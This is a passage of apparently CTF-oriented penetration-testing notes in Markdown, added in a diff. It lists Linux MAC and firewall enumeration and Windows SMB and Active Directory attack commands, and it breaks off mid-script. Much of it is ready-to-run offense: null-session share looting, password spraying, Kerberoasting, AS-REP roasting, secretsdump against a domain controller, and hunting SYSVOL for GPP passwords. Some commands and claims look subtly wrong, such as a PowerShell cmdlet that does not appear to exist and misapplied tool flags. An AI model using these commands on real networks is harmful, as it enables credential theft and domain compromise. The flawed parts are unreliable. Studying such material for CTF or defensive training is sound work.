+```
+
+**Checking for Filtering Without Direct Access**
+
+```bash
+# Port scanning localhost to detect filtering
+nc -zv localhost 1-1000
+
+# Testing specific ports
+echo "test" | nc -v localhost <port>
+
+# Checking packet drops
+iptables -L -n -v -x | grep DROP
+nft list ruleset | grep drop
+```
+
+## SELinux/AppArmor Detection
+
+### SELinux Enumeration
+
+**SELinux Status**
+
+```bash
+getenforce  # Current mode: Enforcing/Permissive/Disabled
+sestatus  # Detailed status
+cat /etc/selinux/config  # Boot configuration
+```
+
+**SELinux Contexts**
+
+```bash
+ls -Z /path/to/file  # File context
+ps -eZ  # Process contexts
+id -Z  # Current user context
+```
+
+**SELinux Policies**
+
+```bash
+seinfo  # Policy information
+seinfo -t  # All types
+seinfo -r  # All roles
+sesearch --allow  # Allow rules
+sesearch --allow -s <source_type> -t <target_type>
+```
+
+**SELinux Booleans**
+
+```bash
+getsebool -a  # All booleans
+getsebool <boolean_name>
+semanage boolean -l  # With descriptions
+```
+
+**SELinux Denials**
+
+```bash
+ausearch -m avc -ts recent  # Recent denials
+grep AVC /var/log/audit/audit.log
+sealert -a /var/log/audit/audit.log  # Human-readable
+journalctl -t setroubleshoot
+```
+
+**SELinux Port Contexts**
+
+```bash
+semanage port -l  # Port type definitions
+semanage port -l | grep <port>
+```
+
+**SELinux File Contexts**
+
+```bash
+semanage fcontext -l
+matchpathcon /path/to/file  # Expected context
+restorecon -nv /path/to/file  # Show what would change
+```
+
+**SELinux User Mappings**
+
+```bash
+semanage login -l
+semanage user -l
+```
+
+**SELinux Modules**
+
+```bash
+semodule -l  # List loaded modules
+semodule --list-modules=full
+```
+
+**Checking for SELinux Bypass Opportunities**
+
+```bash
+# Files in wrong contexts
+find / -context *:user_home_t:* 2>/dev/null
+find / -context *:httpd_sys_script_exec_t:* 2>/dev/null
+
+# Writable locations with executable contexts
+find / -writable -context *:bin_t:* 2>/dev/null
+
+# Permissive domains
+semanage permissive -l
+semodule -l | grep permissive
+```
+
+### AppArmor Enumeration
+
+**AppArmor Status**
+
+```bash
+aa-status  # Detailed status
+systemctl status apparmor
+cat /sys/module/apparmor/parameters/enabled
+```
+
+**AppArmor Profiles**
+
+```bash
+ls /etc/apparmor.d/
+aa-status --profiled  # Profiles in enforce mode
+aa-status --complaining  # Profiles in complain mode
+```
+
+**AppArmor Mode Detection**
+
+```bash
+cat /sys/kernel/security/apparmor/profiles
+aa-status --json
+```
+
+**Process Confinement**
+
+```bash
+ps auxZ | grep -v unconfined
+cat /proc/<PID>/attr/current  # Process AppArmor label
+```
+
+**AppArmor Denials**
+
+```bash
+dmesg | grep -i apparmor
+grep DENIED /var/log/syslog
+grep DENIED /var/log/audit/audit.log
+journalctl | grep -i apparmor | grep -i denied
+```
+
+**Profile Analysis**
+
+```bash
+cat /etc/apparmor.d/<profile>
+aa-logprof  # Interactive log analysis
+aa-genprof  # Generate profile
+```
+
+**AppArmor Capabilities**
+
+```bash
+grep capability /etc/apparmor.d/*
+```
+
+**Checking Profile Enforcement**
+
+```bash
+# Complain mode profiles (less restrictive)
+aa-status | grep complain
+
+# Enforce mode profiles
+aa-status | grep enforce
+
+# Unconfined processes
+aa-unconfined
+aa-unconfined --paranoid
+```
+
+### Combined MAC System Detection
+
+**Detect Active MAC System**
+
+```bash
+if [ -d /sys/kernel/security/selinux ]; then
+    echo "SELinux detected"
+    getenforce
+elif [ -d /sys/kernel/security/apparmor ]; then
+    echo "AppArmor detected"
+    aa-status
+else
+    echo "No MAC system detected"
+fi
+```
+
+**Check Kernel LSM Support**
+
+```bash
+cat /sys/kernel/security/lsm  # Loaded security modules
+cat /proc/cmdline | grep security  # Boot parameters
+```
+
+**Audit Framework Status**
+
+```bash
+auditctl -s  # Audit daemon status
+auditctl -l  # Current audit rules
+cat /etc/audit/audit.rules
+```
+
+### Exploitation Considerations
+
+**SELinux Pivot Points**
+
+- Processes running in `unconfined_t` domain
+- Custom policy modules with overly permissive rules
+- Type transitions that can be triggered
+- Booleans that weaken security when enabled
+- File contexts on writable directories allowing execution
+
+**AppArmor Weaknesses**
+
+- Profiles in complain mode provide no enforcement
+- Overly broad file path patterns (`/*` wildcards)
+- Missing profile coverage on critical binaries
+- Capabilities granted without necessity
+- Link traversal permissions allowing escapes
+
+**Common Bypass Techniques**
+
+```bash
+# SELinux: Check for permissive domains
+sesearch --allow -s unconfined_t
+
+# AppArmor: Unconfined processes
+ps auxZ | grep unconfined
+
+# Check for disabled MAC at boot
+cat /proc/cmdline | grep -E 'selinux=0|apparmor=0|security='
+```
+
+## Critical Files and Locations
+
+**Configuration Discovery**
+
+```bash
+/etc/selinux/
+/etc/apparmor.d/
+/proc/net/
+/proc/sys/net/
+/sys/class/net/
+/etc/iptables/
+/etc/firewalld/
+/etc/ufw/
+```
+
+**Log Analysis**
+
+```bash
+/var/log/audit/audit.log
+/var/log/messages
+/var/log/syslog
+/var/log/kern.log
+journalctl -k  # Kernel messages
+```
+
+## Automated Enumeration Scripts
+
+**LinPEAS Detection**
+
+```bash
+# LinPEAS automatically checks:
+# - Active firewall rules
+# - SELinux/AppArmor status
+# - Network configuration
+# - Process enumeration
+```
+
+**LinEnum Coverage**
+
+```bash
+# LinEnum provides:
+# - Process listing with full paths
+# - Network statistics
+# - Firewall rule dumps
+# - MAC system detection
+```
+
+**Manual Script Template**
+
+```bash
+#!/bin/bash
+echo "[*] Process enumeration"
+ps auxf
+echo "[*] Network configuration"
+ip addr; ip route
+echo "[*] Firewall rules"
+iptables -L -n -v 2>/dev/null || nft list ruleset 2>/dev/null
+echo "[*] MAC system"
+getenforce 2>/dev/null || aa-status 2>/dev/null
+```
+
+---
+
+# # Windows-Specific Enumeration
+
+## SMB Enumeration
+
+### Protocol Overview
+
+SMB (Server Message Block) operates on TCP ports 139 (NetBIOS) and 445 (Direct SMB). Modern implementations use SMB2/SMB3 over port 445.
+
+### Host Discovery and SMB Detection
+
+**Nmap SMB Scripts**
+
+```bash
+nmap -p139,445 --script smb-protocols <target>
+nmap -p445 --script smb-os-discovery <target>
+nmap -p445 --script smb-security-mode <target>
+nmap -p445 --script smb-enum-shares,smb-enum-users <target>
+```
+
+**CrackMapExec (CME)**
+
+```bash
+# Basic SMB enumeration
+crackmapexec smb <target>
+crackmapexec smb <target> -u '' -p ''  # Null session
+crackmapexec smb <target> -u 'guest' -p ''  # Guest session
+
+# Protocol negotiation check
+crackmapexec smb <target> --gen-relay-list relay.txt
+```
+
+### Share Enumeration
+
+**smbclient**
+
+```bash
+# List shares (null session)
+smbclient -L //<target> -N
+
+# List shares with credentials
+smbclient -L //<target> -U <username>
+
+# Connect to specific share
+smbclient //<target>/<share> -U <username>
+
+# Download all files recursively
+smbclient //<target>/<share> -U <username> -c "prompt OFF;recurse ON;mget *"
+```
+
+**smbmap**
+
+```bash
+# Enumerate shares with null session
+smbmap -H <target>
+
+# With credentials
+smbmap -H <target> -u <username> -p <password>
+
+# Recursive listing
+smbmap -H <target> -u <username> -p <password> -R
+
+# Download specific file
+smbmap -H <target> -u <username> -p <password> --download '<share>\<path>\<file>'
+
+# Execute command (if permissions allow)
+smbmap -H <target> -u <username> -p <password> -x 'whoami'
+```
+
+**enum4linux**
+
+```bash
+# Full enumeration
+enum4linux -a <target>
+
+# Specific enumerations
+enum4linux -S <target>  # Share enumeration
+enum4linux -U <target>  # User enumeration
+enum4linux -G <target>  # Group enumeration
+enum4linux -P <target>  # Password policy
+```
+
+**enum4linux-ng** (Improved Python version)
+
+```bash
+enum4linux-ng -A <target>
+enum4linux-ng -As <target> -oY output.yaml
+```
+
+### RPC Enumeration
+
+**rpcclient**
+
+```bash
+# Connect with null session
+rpcclient -U '' -N <target>
+
+# Connect with credentials
+rpcclient -U <username> <target>
+
+# Common enumeration commands (once connected):
+srvinfo          # Server information
+enumdomains      # Enumerate domains
+querydominfo     # Domain information
+enumdomusers     # List domain users
+enumdomgroups    # List domain groups
+queryuser <RID>  # User details by RID
+querygroupmem <RID>  # Group membership
+enumprivs        # Enumerate privileges
+```
+
+**Automated RPC Queries**
+
+```bash
+# User enumeration via RPC
+for i in $(seq 500 1100); do rpcclient -N -U "" <target> -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name"; done
+```
+
+### Null Session Testing
+
+**Net Command (from Windows)**
+
+```cmd
+net use \\<target>\IPC$ "" /user:""
+net view \\<target>
+```
+
+**Linux Null Session**
+
+```bash
+smbclient -L //<target> -N
+rpcclient -U '' -N <target>
+```
+
+### SMB Version Detection
+
+**Metasploit**
+
+```bash
+msfconsole
+use auxiliary/scanner/smb/smb_version
+set RHOSTS <target>
+run
+```
+
+**Manual Banner Grab**
+
+```bash
+nmap -p445 --script smb-protocols <target>
+```
+
+### SMB Signing Analysis
+
+```bash
+# Check if SMB signing is required
+nmap --script smb-security-mode -p445 <target>
+crackmapexec smb <target> --gen-relay-list unsigned.txt
+```
+
+### Vulnerability Scanning
+
+**EternalBlue (MS17-010)**
+
+```bash
+nmap --script smb-vuln-ms17-010 -p445 <target>
+
+# Metasploit scanner
+use auxiliary/scanner/smb/smb_ms17_010
+```
+
+**Common SMB Vulnerabilities**
+
+```bash
+nmap --script smb-vuln* -p445 <target>
+```
+
+---
+
+## Active Directory Enumeration
+
+### Domain Information Gathering
+
+**ldapsearch** (Anonymous LDAP queries)
+
+```bash
+# Base domain enumeration
+ldapsearch -x -h <DC-IP> -s base namingcontexts
+
+# Enumerate all objects
+ldapsearch -x -h <DC-IP> -b "DC=domain,DC=local"
+
+# With credentials
+ldapsearch -x -h <DC-IP> -D "user@domain.local" -w '<password>' -b "DC=domain,DC=local"
+
+# Enumerate users
+ldapsearch -x -h <DC-IP> -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName
+
+# Enumerate groups
+ldapsearch -x -h <DC-IP> -b "DC=domain,DC=local" "(objectClass=group)" cn member
+```
+
+**CrackMapExec AD Enumeration**
+
+```bash
+# Enumerate domain users
+crackmapexec smb <DC-IP> -u <username> -p <password> --users
+
+# Enumerate domain groups
+crackmapexec smb <DC-IP> -u <username> -p <password> --groups
+
+# Enumerate password policy
+crackmapexec smb <DC-IP> -u <username> -p <password> --pass-pol
+
+# Enumerate logged-on users
+crackmapexec smb <target> -u <username> -p <password> --loggedon-users
+
+# Enumerate local admin access
+crackmapexec smb <targets> -u <username> -p <password> --local-auth
+```
+
+### BloodHound Data Collection
+
+**SharpHound (Windows collector)**
+
+```powershell
+# From Windows with credentials
+.\SharpHound.exe -c All -d domain.local --domaincontroller <DC-IP>
+
+# Specific collection methods
+.\SharpHound.exe -c Session,LoggedOn,Group,Trusts
+```
+
+**BloodHound.py** (Python collector from Linux)
+
+```bash
+# Full collection
+bloodhound-python -u <username> -p <password> -ns <DC-IP> -d domain.local -c all
+
+# Specific collections
+bloodhound-python -u <username> -p <password> -ns <DC-IP> -d domain.local -c DCOnly
+```
+
+### Impacket Tools for AD Enumeration
+
+**GetADUsers.py**
+
+```bash
+GetADUsers.py -all domain.local/username:password -dc-ip <DC-IP>
+```
+
+**GetUserSPNs.py** (Kerberoasting)
+
+```bash
+GetUserSPNs.py domain.local/username:password -dc-ip <DC-IP> -request
+```
+
+**GetNPUsers.py** (AS-REP Roasting)
+
+```bash
+# Find users without pre-auth required
+GetNPUsers.py domain.local/ -dc-ip <DC-IP> -usersfile users.txt -format hashcat
+```
+
+**secretsdump.py**
+
+```bash
+secretsdump.py domain.local/username:password@<DC-IP>
+```
+
+### LDAP Enumeration Tools
+
+**ldapdomaindump**
+
+```bash
+ldapdomaindump -u 'domain.local\username' -p 'password' <DC-IP>
+```
+
+**windapsearch**
+
+```bash
+# Enumerate users
+python3 windapsearch.py -d domain.local -u username -p password --dc-ip <DC-IP> -U
+
+# Enumerate privileged users
+python3 windapsearch.py -d domain.local -u username -p password --dc-ip <DC-IP> --privileged-users
+
+# Enumerate computers
+python3 windapsearch.py -d domain.local -u username -p password --dc-ip <DC-IP> -C
+```
+
+### Kerberos Enumeration
+
+**kerbrute** (Username enumeration)
+
+```bash
+# User enumeration via Kerberos
+kerbrute userenum -d domain.local --dc <DC-IP> userlist.txt
+
+# Password spraying
+kerbrute passwordspray -d domain.local --dc <DC-IP> users.txt 'Password123'
+```
+
+**GetNPUsers.py** (AS-REP Roasting without credentials)
+
+```bash
+GetNPUsers.py domain.local/ -dc-ip <DC-IP> -no-pass -usersfile users.txt
+```
+
+---
+
+## Domain Controller Discovery
+
+### Network-Based Discovery
+
+**Nmap DC Detection**
+
+```bash
+# Standard DC ports
+nmap -p88,389,445,464,636,3268,3269 <target-range>
+
+# LDAP service detection
+nmap -p389,636 --script ldap-rootdse <target>
+```
+
+**DNS Queries for DC Discovery**
+
+```bash
+# SRV record enumeration
+nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.local <DNS-server>
+nslookup -type=SRV _kerberos._tcp.dc._msdcs.domain.local <DNS-server>
+
+# Using dig
+dig @<DNS-server> _ldap._tcp.dc._msdcs.domain.local SRV
+```
+
+**CrackMapExec DC Discovery**
+
+```bash
+# Identify domain controllers
+crackmapexec smb <target-range> --gen-relay-list dc-list.txt
+```
+
+### From Windows Host
+
+**PowerShell DC Discovery**
+
+```powershell
+# Get domain controllers
+[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers
+
+# Get PDC emulator
+[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner
+
+# NLTEST
+nltest /dclist:domain.local
+nltest /dsgetdc:domain.local
+```
+
+**CMD DC Discovery**
+
+```cmd
+# NetBIOS-based discovery
+net group "Domain Controllers" /domain
+
+# DNS-based discovery
+nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.local
+```
+
+### LDAP-Based DC Discovery
+
+```bash
+# Anonymous LDAP query for DCs
+ldapsearch -x -h <DC-IP> -s base -b "" "(objectClass=*)" dnsHostName
+
+# Authenticated query for all DCs
+ldapsearch -x -h <DC-IP> -D "user@domain.local" -w 'password' -b "OU=Domain Controllers,DC=domain,DC=local" "(objectClass=computer)" dNSHostName
+```
+
+### FSMO Role Discovery
+
+**From Linux with rpcclient**
+
+```bash
+rpcclient -U username <DC-IP> -c "getdompwinfo"
+```
+
+**PowerShell FSMO Enumeration**
+
+```powershell
+netdom query fsmo
+Get-ADForest | Select-Object SchemaMaster,DomainNamingMaster
+Get-ADDomain | Select-Object PDCEmulator,RIDMaster,InfrastructureMaster
+```
+
+---
+
+## User Enumeration
+
+### RID Cycling
+
+**enum4linux RID Cycling**
+
+```bash
+enum4linux -r -u "username" -p "password" <target>
+```
+
+**Impacket lookupsid.py**
+
+```bash
+# Enumerate users via RID cycling
+lookupsid.py domain.local/username:password@<target>
+
+# Specify RID range
+lookupsid.py domain.local/username:password@<target> 500-2000
+```
+
+**CrackMapExec RID Cycling**
+
+```bash
+crackmapexec smb <target> -u username -p password --rid-brute
+```
+
+### LDAP User Enumeration
+
+```bash
+# All user accounts
+ldapsearch -x -h <DC-IP> -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName userPrincipalName
+
+# Active accounts only
+ldapsearch -x -h <DC-IP> -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" sAMAccountName
+
+# Service accounts (SPNs)
+ldapsearch -x -h <DC-IP> -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName
+
+# Admin accounts
+ldapsearch -x -h <DC-IP> -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(adminCount=1)" sAMAccountName
+```
+
+### Kerberos-Based User Enumeration
+
+**kerbrute**
+
+```bash
+# User enumeration (no credentials required)
+kerbrute userenum -d domain.local --dc <DC-IP> userlist.txt
+
+# Output valid users
+kerbrute userenum -d domain.local --dc <DC-IP> userlist.txt -o valid-users.txt
+```
+
+**Nmap Kerberos Enumeration**
+
+```bash
+nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm='domain.local',userdb=users.txt <DC-IP>
+```
+
+### SMB User Enumeration
+
+**CrackMapExec User Enumeration**
+
+```bash
+# List domain users
+crackmapexec smb <DC-IP> -u username -p password --users
+
+# Export to file
+crackmapexec smb <DC-IP> -u username -p password --users | grep -oP 'domain.local\\\K\S+' > users.txt
+```
+
+**rpcclient User Enumeration**
+
+```bash
+rpcclient -U username <DC-IP>
+> enumdomusers
+> queryuser <RID>
+> querydispinfo
+```
+
+### Gathering User Attributes
+
+**Important User Attributes via LDAP**
+
+```bash
+# User details including description (often contains passwords)
+ldapsearch -x -h <DC-IP> -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName description info
+
+# Password policy attributes
+ldapsearch -x -h <DC-IP> -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(objectClass=user)" pwdLastSet badPwdCount
+
+# Users with no password expiration
+ldapsearch -x -h <DC-IP> -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(userAccountControl:1.2.840.113556.1.4.803:=65536)" sAMAccountName
+```
+
+### Group Membership Enumeration
+
+```bash
+# Enumerate all groups
+ldapsearch -x -h <DC-IP> -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(objectClass=group)" cn member
+
+# Domain Admins specifically
+ldapsearch -x -h <DC-IP> -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(cn=Domain Admins)" member
+
+# Nested group membership
+net rpc group members "Domain Admins" -U domain.local/username%password -S <DC-IP>
+```
+
+**CrackMapExec Group Enumeration**
+
+```bash
+crackmapexec smb <DC-IP> -u username -p password --groups
+crackmapexec ldap <DC-IP> -u username -p password --groups
+```
+
+### Privileged User Discovery
+
+**Accounts with adminCount=1**
+
+```bash
+ldapsearch -x -h <DC-IP> -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(adminCount=1)" sAMAccountName memberOf
+```
+
+**Users with SPN (Kerberoastable)**
+
+```bash
+GetUserSPNs.py domain.local/username:password -dc-ip <DC-IP>
+```
+
+**Users without Kerberos Pre-Auth (AS-REP Roastable)**
+
+```bash
+GetNPUsers.py domain.local/username:password -dc-ip <DC-IP>
+```
+
+---
+
+**Key Enumeration Considerations**
+
+**[Inference]** During CTF scenarios, the following enumeration priorities typically yield results:
+
+1. Null session and guest access attempts first (low-hanging fruit)
+2. RID cycling for user discovery when credentials are unavailable
+3. LDAP queries for comprehensive AD enumeration when credentials exist
+4. Kerberos-based techniques for stealthy enumeration without SMB logging
+
+**Important Subtopics for Further Study:**
+
+- **Pass-the-Hash and Pass-the-Ticket techniques** for lateral movement after enumeration
+- **GPO Enumeration** for privilege escalation vectors
+- **Trust Relationship Enumeration** for cross-domain attacks
+- **SYSVOL and NETLOGON share analysis** for credential harvesting
+
+---
+
+## Share Enumeration
+
+Windows share enumeration identifies network-accessible resources, maps permissions, discovers hidden shares, and locates credential artifacts for lateral movement and privilege escalation.
+
+**Network Share Discovery**
+
+Identify shared resources on target systems from remote reconnaissance:
+
+```bash
+nmap -sV --script smb-enum-shares <target>
+nmap -sV --script smb-enum-shares,smb-os-discovery <target>
+```
+
+The `smb-enum-shares` Nmap script connects to SMB services (typically port 445 or 139) and enumerates available shares without authentication when null sessions are enabled [Inference] though actual share visibility depends on server configuration and null session restrictions.
+
+Use `smbclient` for direct enumeration:
+
+```bash
+smbclient -L //<target> -N
+smbclient -L //<target> -U ""
+smbclient -L //<target> -U "domain/user%password"
+```
+
+The `-L` flag lists shares; `-N` suppresses password prompt for null session attempts; `-U` specifies credentials. Output displays sharenames, types (SMBSERVER, PRINTER, IPC$, TEMPORARY), and comments.
+
+**Null Session and Guest Access Testing**
+
+Attempt to connect without credentials:
+
+```bash
+smbclient //<target>/sharename -N
+smbclient //<target>/IPC$ -N
+rpcclient -U "" <target> -N
+net use \\<target>\share
+```
+
+The `IPC$` share provides inter-process communication access [Unverified] enabling RPC-based enumeration without file system access on systems where IPC$ is accessible to null sessions, though modern Windows defaults restrict this.
+
+Interactive null session shell:
+
+```bash
+smbclient -L //<target> -N
+# Once connected
+ls
+cd directory
+get filename
+put localfile remotename
+```
+
+**Hidden Share Discovery**
+
+Enumerate hidden shares (suffixed with $) accessible through specific enumeration methods:
+
+```bash
+nmap --script smb-enum-shares <target>
+enum4linux -S <target>
+enum4linux -S -u "" -p "" <target>
+```
+
+Hidden shares (C$, D$, IPC$, ADMIN$) provide [Inference] administrative access when null sessions are enabled, though administrative shares typically require elevated privileges for connection regardless of null session configuration.
+
+Automated enumeration via `crackmapexec`:
+
+```bash
+crackmapexec smb <target> --shares
+crackmapexec smb <target> -u "" -p "" --shares
+crackmapexec smb <target> -u "user" -p "password" --shares
+```
+
+**Share Permission Analysis**
+
+Examine access permissions on discovered shares:
+
+```bash
+smbcacls //<target>/sharename /path/to/file -U "user%password"
+```
+
+Test write permissions by attempting file operations:
+
+```bash
+smbclient //<target>/sharename -U "user%password"
+# Within smbclient
+put testfile.txt
+del testfile.txt
+```
+
+World-writable shares (readable and writable by any authenticated user) enable [Inference] arbitrary file placement, configuration modification, or credential harvesting depending on share contents and accessibility, though actual exploitation depends on file types and applications consuming those files.
+
+**Special Share Identification**
+
+Administrative shares reveal [Inference] system information and enable privileged operations:
+
+- **C$, D$, etc.** — Drive root directories, accessible to administrators
+- **IPC$** — Pipe share for inter-process communication and RPC operations
+- **ADMIN$** — Remote administration share pointing to `%windir%`
+- **SYSVOL** — Group Policy distribution on domain controllers
+- **NETLOGON** — Domain logon scripts and user profiles
+
+Access to SYSVOL or NETLOGON shares enables [Inference] Group Policy object analysis and potential credential extraction through domain scripts, though specific exploitation depends on policy content and script content.
+
+**Credential Artifact Discovery**
+
+Search mounted shares for sensitive files:
+
+```bash
+smbclient //<target>/sharename -U "user%password"
+# Within smbclient
+search *.txt
+search *password*
+search *config*
+recurse on
+ls -R
+```
+
+Look for configuration files (web.config, app.config), batch scripts, PowerShell scripts containing credentials, or backup files containing sensitive data. [Unverified] The prevalence of hardcoded credentials in configuration files varies by organization and application, though configuration discovery remains a standard enumeration practice.
+
+**Recursive Share Enumeration and Mapping**
+
+Map entire directory structures:
+
+```bash
+smbmap -H <target> -u "" -p ""
+smbmap -H <target> -u "user" -p "password"
+smbmap -H <target> -u "user" -p "password" -R sharename
+```
+
+The `smbmap` tool recursively explores shares, displays file listings with permissions, and identifies writable directories. Output format shows share paths, permissions, and file types.
+
+**Share Credential Harvesting**
+
+Extract credentials from accessible share resources:
+
+```bash
+find /mnt/smb_mount -name "*password*" -o -name "*.conf" -o -name "*.config"
+grep -r "password\|credential\|username" /mnt/smb_mount --include="*.txt" --include="*.conf" --include="*.xml"
+```
+
+Mounted shares expose application configurations, deployment scripts, and backup files potentially containing embedded credentials [Inference] though credential formats and extraction feasibility depend on file types and encryption status.
+
+---
+
+## Group Policy Enumeration
+
+Group Policy enumeration identifies domain policies, extracts policy settings, discovers policy-based credentials, and maps policy application to systems for privilege escalation and lateral movement.
+
+**Domain Group Policy Discovery**
+
+Enumerate Group Policy Objects on domain controllers:
+
+```bash
+nmap -sV --script smb-enum-domains <target-dc>
+enum4linux -G <target-dc>
+rpcclient -U "domain/user%password" <target-dc> -c "enumdomgroups"
+```
+
+Connect to domain controller SMB services and query RPC endpoints for policy information.
+
+**SYSVOL and NETLOGON Access**
+
+Access domain policy distribution points:
+
+```bash
+smbclient //<target-dc>/SYSVOL -U "domain/user%password"
+smbclient //<target-dc>/NETLOGON -U "domain/user%password"
+mount -t cifs //<target-dc>/SYSVOL /mnt/sysvol -o username=user,password=password,domain=domain
+```
+
+The SYSVOL share contains Group Policy Objects (GPOs) in XML format, user scripts, and logon scripts. Policy structure:
+
+```
+\\<domain>\sysvol\<domain>\Policies\{<GUID>}\
+```
+
+Each GUID represents a distinct policy object. Subdirectories include:
+
+- `Machine/` — Computer configuration policies
+- `User/` — User configuration policies
+- `Scripts/` — Logon/logoff scripts and administrative scripts
+
+**GPO Credential Extraction**
+
+Search policy files for embedded credentials:
+
+```bash
+grep -r "password\|cpassword\|username" /mnt/sysvol --include="*.xml"
+find /mnt/sysvol -name "*.xml" -exec grep -l "cpassword" {} \;
+```
+
+Group Policy Preferences (GPP) stored credentials in `Groups.xml` files using reversible encryption [Unverified] though Microsoft deprecated this functionality in newer Windows versions due to security concerns. The `cpassword` field contains AES-encrypted credentials.
+
+Extract GPP passwords using specialized tools:
+
+```bash
+gpp-decrypt "cpassword_value"
+```
+
+The GPP encryption uses a known static key [Inference] enabling straightforward decryption of extracted credentials, though this vector is patched in modern Windows environments with GPP encryption disabled by default.
+
+**Policy Script Analysis**
+
+Examine scripts referenced in policies:
+
+```bash
+cat /mnt/sysvol/<domain>/Policies/{<GUID>}/Machine/Scripts/scripts.ini
+cat /mnt/sysvol/<domain>/Policies/{<GUID>}/User/Scripts/scripts.ini
+```
+
+Scripts may contain hardcoded credentials, service account credentials, or commands executed during logon/logoff [Inference] providing execution context with system or domain privileges depending on script type and execution context configuration.
+
+**Registry-Based Policy Enumeration (Local)**
+
+From compromised systems, examine applied policies:
+
+```powershell
+Get-GPO -All
+Get-GPOReport -All -ReportType Xml
+gpresult /h report.html
+gpresult /scope:computer /h computer-policy.html
+gpresult /scope:user /h user-policy.html
+```
+
+The `gpresult` command displays Group Policy application results. Analyze output to identify policies applicable to the current user/computer context.
+
+**Policy Permissions and Application**
+
+Identify policy scope and application:
+
+```bash
+smbcacls //<target-dc>/SYSVOL "/Policies/{<GUID>}" -U "user%password"
+```
+
+Policies with write permissions allow [Inference] modification enabling privilege escalation through malicious policy application, though write permissions on policies typically require domain administrator privileges or specific delegated permissions.
+
+**Domain Group Policy Preferences Analysis**
+
+Discover policy-referenced resources:
+
+```bash
+find /mnt/sysvol -name "scheduledtasks.xml" -o -name "services.xml" -o -name "printers.xml"
+cat /mnt/sysvol/<domain>/Policies/{<GUID>}/Machine/Preferences/ScheduledTasks/ScheduledTasks.xml
+```
+
+Policy preferences define scheduled tasks, services, mapped drives, and other configurations. Scheduled tasks may reference executables with embedded credentials or execute commands with elevated privileges.
+
+**Policy Application Timeline**
+
+Determine policy age and modification status:
+
+```bash
+stat /mnt/sysvol/<domain>/Policies/{<GUID>}
+```
+
+Recently modified policies may indicate [Inference] active administration or response to security incidents, while older policies may contain deprecated configurations or legacy credentials.
+
+**Kerberos Policy Enumeration**
+
+Extract Kerberos-related policies:
+
+```bash
+grep -r "kerberos\|ticket\|krbtgt" /mnt/sysvol --include="*.xml" -i
+```
+
+Policies may specify Kerberos ticket lifetimes, encryption algorithms, or pre-authentication requirements affecting attack surface [Unverified] though specific policy impact on Kerberos behavior depends on Windows version and configuration.
+
+---
+
+## Kerberos Enumeration
+
+Kerberos enumeration identifies domain users, discovers service accounts, maps service-to-account relationships, and enumerates ticket-granting ticket (TGT) information for credential theft and privilege escalation.
+
+**Domain User Discovery via Kerberos**
+
+Enumerate domain users through Kerberos name resolution:
+
+```bash
+kerbrute userenum --dc <target-dc> userlist.txt
+kerbrute userenum --dc <target-dc> -d domain.local userlist.txt
+```
+
+The `kerbrute` tool queries the Kerberos authentication service with username attempts. Responses differ between valid and invalid usernames [Inference] enabling user enumeration against domain controllers even when null SMB sessions are disabled, though specific response parsing depends on Kerberos implementation details.
+
+Alternative enumeration via LDAP (over Kerberos):
+
+```bash
+ldapsearch -H ldap://<target-dc> -x -s sub "(objectClass=user)" sAMAccountName
+ldapsearch -H ldap://<target-dc> -x -s sub "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=512))" sAMAccountName
+```
+
+The `-x` flag disables SASL authentication; `-s sub` searches subtree. LDAP query filters identify user objects and account control flags.
+
+**Service Principal Name (SPN) Enumeration**
+
+Discover service accounts and their associated services:
+
+```bash
+setspn -L <domain-controller>
+setspn -T <domain> -F -Q */*
+```
+
+Alternatively, using `GetUserSPNs.py` from Impacket:
+
+```bash
+GetUserSPNs.py domain.local/user:password
+GetUserSPNs.py -dc-ip <target-dc> domain.local/user:password
+```
+
+SPN format: `service_class/hostname:port/service_name`. Output reveals [Inference] which services run under specific user accounts, enabling targeted Kerberoasting attacks against those service accounts, though actual exploitation requires valid domain credentials for TGT acquisition.
+
+**Kerberos Pre-Authentication Analysis**
+
+Identify accounts with pre-authentication disabled:
+
+```bash
+GetNPUsers.py domain.local/ -usersfile userlist.txt
+GetNPUsers.py -dc-ip <target-dc> domain.local/user:password
+```
+
+Accounts with pre-authentication disabled (UserAccountControl flag 0x400000) allow [Inference] AS-REP Roasting attacks where attackers request authentication responses without providing credentials, enabling offline password cracking for affected accounts, though this configuration is uncommon in modern domains.
+
+Alternatively, query via LDAP:
+
+```bash
+ldapsearch -H ldap://<target-dc> -x "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName
+```
+
+**TGT Acquisition and Inspection**
+
+Request Kerberos TGTs using known credentials:
+
+```bash
+kinit user@DOMAIN.LOCAL
+kinit -c /tmp/ccache_file user@DOMAIN.LOCAL
+```
+
+On Windows:
+
+```powershell
+$credential = New-Object System.Management.Automation.PSCredential("DOMAIN\user", (ConvertTo-SecureString "password" -AsPlainText -Force))
+New-NetLogonUser -Credential $credential
+```
+
+List cached tickets:
+
+```bash
+klist
+klist -c /tmp/ccache_file
+```
+
+**Kerberoasting**
+
+Extract service ticket hashes for offline cracking:
+
+```bash
+GetUserSPNs.py -request domain.local/user:password
+GetUserSPNs.py -dc-ip <target-dc> -request domain.local/user:password
+```
+
+Output displays extracted TGS (Ticket Granting Service) tickets in crackable format. Alternatively, from Windows:
+
+```powershell
+Add-Type -AssemblyName System.IdentityModel
+$DCName = "<domain-controller>"
